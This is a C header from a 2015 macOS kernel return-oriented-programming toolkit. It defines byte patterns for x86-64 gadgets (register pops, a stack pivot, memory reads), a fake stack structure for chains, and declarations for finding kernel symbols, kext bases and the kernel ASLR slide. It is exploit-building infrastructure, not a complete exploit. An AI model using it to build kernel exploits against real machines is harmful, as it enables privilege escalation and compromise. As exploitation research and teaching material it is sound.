//
//  ropnroll.h
//  ropnroll_final
//
//  Created by jndok on 14/11/15.
//  Copyright © 2015 jndok. All rights reserved.
//

#ifndef ropnroll_h
#define ropnroll_h

#define KSLIDE_UNKNOWN -1

#define KAS_INFO_KERNEL_TEXT_SLIDE_SELECTOR (0)
#define KAS_INFO_MAX_SELECTOR (1)

#define FLAG_SLIDE_KERNEL_POINTERS 0x1

#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>

/* thx to qwertyoruiop for useful gadgets :P */

#define POP_RAX(map) locate_gadget_in_map(map, (char*)((uint8_t[]){0x58, 0xC3}), 2 )
#define POP_RCX(map) locate_gadget_in_map(map, (char*)((uint8_t[]){0x59, 0xC3}), 2 )
#define POP_RDX(map) locate_gadget_in_map(map, (char*)((uint8_t[]){0x5A, 0xc3}), 2 )
#define POP_RBX(map) locate_gadget_in_map(map, (char*)((uint8_t[]){0x5B, 0xc3}), 2 )
#define POP_RSP(map) locate_gadget_in_map(map, (char*)((uint8_t[]){0x5C, 0xC3}), 2 )
#define POP_RBP(map) locate_gadget_in_map(map, (char*)((uint8_t[]){0x5D, 0xc3}), 2 )
#define POP_RSI(map) locate_gadget_in_map(map, (char*)((uint8_t[]){0x5E, 0xc3}), 2 )
#define POP_RDI(map) locate_gadget_in_map(map, (char*)((uint8_t[]){0x5F, 0xc3}), 2 )

#define RAX_TO_RDI_POP_RBP_JMP_RCX(map) locate_gadget_in_map(map, (char*)((uint8_t[]){0x48, 0x89, 0xC7, 0x5D, 0xFF, 0xE1}), 6)
#define READ_RAX_TO_RAX_POP_RBP(map) locate_gadget_in_map(map, (char*)((uint8_t[]){0x48,0x8B,0x00,0x5D,0xC3}), 5)

#define NULL_OP(map) locate_gadget_in_map(map, (char*)((uint8_t[]){0x90, 0xC3}), 2)

#define PIVOT_RAX(map) locate_gadget_in_map(map, (char*)((uint8_t[]){0x50, 0x01, 0x00, 0x00, 0x5b, 0x41, 0x5c, 0x41, 0x5e, 0x41, 0x5F, 0x5D, 0xC3}), 13)

typedef struct fake_stack {
    uint64_t chain[0x1000];
    uint64_t cnt;
} fake_stack_t;

typedef struct mapping {
    void *map;
    size_t map_size;
} mapping_t;

typedef const char* gadget_t;
typedef const size_t gadget_size_t;

extern uint64_t KextUnslidBaseAddress(const char *KextBundleName);

struct segment_command_64 *find_segment_in_map(mapping_t *map, const char *segname);

uint32_t calculate_gadget_size(gadget_t gadget);

uint64_t locate_gadget_in_map(mapping_t *map, gadget_t gadget, gadget_size_t sz);
uint64_t locate_symbol_in_map(mapping_t *map, const char *sym_name);

uint64_t locate_kernel_text(mapping_t *map);

uint64_t kext_base_address(const char *bundle_id);

uint64_t get_kslide(void);
uint64_t slide_kernel_pointer(uint64_t pointer, uint64_t kslide);

#endif /* ropnroll_h */
